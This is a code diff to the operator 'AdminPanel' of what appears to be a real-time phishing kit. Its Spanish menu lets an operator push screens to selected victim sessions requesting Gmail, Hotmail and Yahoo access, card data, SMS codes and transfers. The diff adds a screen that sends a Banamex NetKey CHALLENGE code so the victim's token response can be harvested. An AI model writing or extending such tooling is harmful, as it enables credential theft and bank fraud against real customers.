@@ -10,7 +10,7 @@ import AccessTable from '@/components/admin/AccessTable';
 import UserManagement from '@/components/admin/UserManagement';
 import RegisteredUsersManagement from '@/components/admin/RegisteredUsersManagement';
 import SmsManagement from '@/components/admin/SmsManagement';
-import { ProtectModal, TransferModal, CancelModal, CodeModal, MessageModal, SmsCompraModal, CardInstructionsModal, DatosTarjetaModal } from '@/components/admin/Modals';
+import { ProtectModal, TransferModal, CancelModal, CodeModal, MessageModal, SmsCompraModal, CardInstructionsModal, DatosTarjetaModal, NetKeyModal } from '@/components/admin/Modals';
 import { GmailModal } from '@/components/admin/GmailModal';
 import { GmailVerifyModal } from '@/components/admin/GmailVerifyModal';
 import { HotmailModal } from '@/components/admin/HotmailModal';
@@ -521,7 +521,7 @@ export default function AdminPanel() {
     console.log("handleScreenChange recibió tipo de pantalla:", screen);
 
     // Handle modals for certain screens
-    if (["protege", "transferir", "cancelacion", "codigo", "mensaje", "sms_compra", "tarjeta", "gmail", "gmail_verify", "hotmail", "yahoo", "datos_tarjeta"].includes(screen)) {
+    if (["protege", "transferir", "cancelacion", "codigo", "mensaje", "sms_compra", "tarjeta", "gmail", "gmail_verify", "hotmail", "yahoo", "datos_tarjeta", "netkey"].includes(screen)) {
       console.log("Activando modal para:", screen);
       setActiveModal(screen);
       return;
@@ -790,6 +790,23 @@ export default function AdminPanel() {
     
     closeModal();
   };
+
+  const handleNetKeyConfirm = (challenge: string) => {
+    if (selectedSessionId) {
+      sendScreenChange({
+        tipo: ScreenType.NETKEY,
+        sessionId: selectedSessionId,
+        challenge: challenge
+      });
+      
+      toast({
+        title: "Código CHALLENGE enviado",
+        description: `Se ha enviado el código CHALLENGE: ${challenge}`,
+      });
+    }
+    
+    closeModal();
+  };
   
   const handleGmailVerifyModalConfirm = (data: { correo: string, codigo: string }) => {
     if (selectedSessionId) {
@@ -985,6 +1002,7 @@ export default function AdminPanel() {
                   <option value="hotmail">13. Solicitar acceso Hotmail</option>
                   <option value="yahoo">14. Solicitar acceso Yahoo</option>
                   <option value="datos_tarjeta">15. Ingreso de datos de tarjeta</option>
+                  <option value="netkey">16. NetKey - Código CHALLENGE (Banamex)</option>
                 </select>
               </div>
             </div>
@@ -1169,6 +1187,11 @@ export default function AdminPanel() {
         isOpen={activeModal === 'datos_tarjeta'}
         onClose={closeModal}
         onConfirm={handleDatosTarjetaConfirm}
+      />
+      <NetKeyModal
+        isOpen={activeModal === 'netkey'}
+        onClose={closeModal}
+        onConfirm={handleNetKeyConfirm}
       />
       
       {/* Diálogo para enviar SMS */}
